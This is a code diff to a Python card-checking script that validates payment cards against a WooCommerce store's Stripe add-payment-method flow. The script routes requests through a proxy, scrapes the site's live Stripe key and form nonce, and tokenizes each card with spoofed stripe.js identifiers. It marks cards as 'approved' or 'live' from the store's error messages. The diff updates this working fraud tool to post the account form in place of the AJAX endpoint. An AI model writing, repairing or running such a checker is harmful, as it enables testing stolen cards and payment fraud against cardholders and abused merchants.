@@ -79,11 +79,17 @@ def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: st
             timeout=25
         )
 
-        # Step 3: GET /my-account/payment-methods/
-        r2 = s.get(f"{base_url}/my-account/payment-methods/", headers={'referer': f'{base_url}/my-account/'}, timeout=25)
-        an = jn(r2.text, 'createAndConfirmSetupIntentNonce')
-        if not an:
-            return "error", "Failed to extract setup intent nonce", "UNKNOWN"
+        # Step 3: GET /my-account/add-payment-method/
+        r2 = s.get(f"{base_url}/my-account/add-payment-method/", headers={'referer': f'{base_url}/my-account/'}, timeout=25)
+        html2 = r2.text
+
+        m_pk = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html2) or re.search(r'(pk_live_[a-zA-Z0-9]+)', html2)
+        pk_val = m_pk.group(1) if m_pk else pk
+
+        m_form_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html2)
+        form_nonce = m_form_nonce.group(1) if m_form_nonce else None
+        if not form_nonce:
+            return "error", "Failed to extract add payment method nonce", "UNKNOWN"
 
         # Step 4: Tokenize card via Stripe API
         stripe_res = s.post(
@@ -96,7 +102,8 @@ def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: st
                 'card[exp_year]': yy,
                 'card[exp_month]': mm,
                 'billing_details[address][country]': 'US',
-                'key': pk,
+                'billing_details[address][postal_code]': '10001',
+                'key': pk_val,
                 '_stripe_version': '2024-06-20',
                 'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
                 'guid': rnd(48),
@@ -120,42 +127,34 @@ def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: st
         if not pm_id:
             return "error", "Failed to tokenize card", brand
 
-        # Step 5: Confirm SetupIntent via AJAX
-        confirm_res = s.post(
-            f"{base_url}/",
-            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
-            headers={
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': base_url,
-                'referer': f'{base_url}/my-account/add-payment-method/',
-                'x-requested-with': 'XMLHttpRequest'
-            },
-            data={
-                'action': 'create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': pm_id,
-                'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': an
-            },
-            timeout=30
-        ).json()
+        # Step 5: Confirm SetupIntent via WooCommerce form post
+        form_data = {
+            'payment_method': 'stripe',
+            'wc-stripe-payment-method': pm_id,
+            'wc-stripe-payment-type': 'card',
+            'woocommerce-add-payment-method-nonce': form_nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'woocommerce_add_payment_method': '1'
+        }
+        r_form = s.post(f"{base_url}/my-account/add-payment-method/", data=form_data, timeout=30)
+        res_html = r_form.text
 
-        if confirm_res.get('success'):
+        if 'woocommerce-message' in res_html or 'Dodana nova kartica' in res_html:
             return "approved", "Payment Method Added", brand
 
-        dt = confirm_res.get('data', {})
-        if isinstance(dt, dict):
-            if dt.get('status') == 'requires_action':
-                return "3ds", "Requires Action (3DS)", brand
-            e = dt.get('error', {})
-            msg = e.get('message', 'Unknown') if isinstance(e, dict) else str(e)
-            low_msg = msg.lower()
-            if "security code" in low_msg:
-                return "live", msg, brand
-            if "insufficient" in low_msg:
-                return "live", msg, brand
-            return "declined", msg, brand
+        if 'woocommerce-error' in res_html:
+            m_err = re.search(r'class="woocommerce-error"[^>]*>\s*<li>(.*?)</li>', res_html, re.DOTALL)
+            if m_err:
+                msg = re.sub(r'<[^>]+>', '', m_err.group(1)).strip()
+                low_msg = msg.lower()
+                if "security code" in low_msg or "cvc" in low_msg:
+                    return "live", msg, brand
+                if "insufficient" in low_msg:
+                    return "live", msg, brand
+                return "declined", msg, brand
+            return "declined", "Card Was Declined", brand
 
-        return "declined", str(dt), brand
+        return "declined", "Card Was Declined", brand
 
     except Exception as e:
         return "error", str(e), "UNKNOWN"
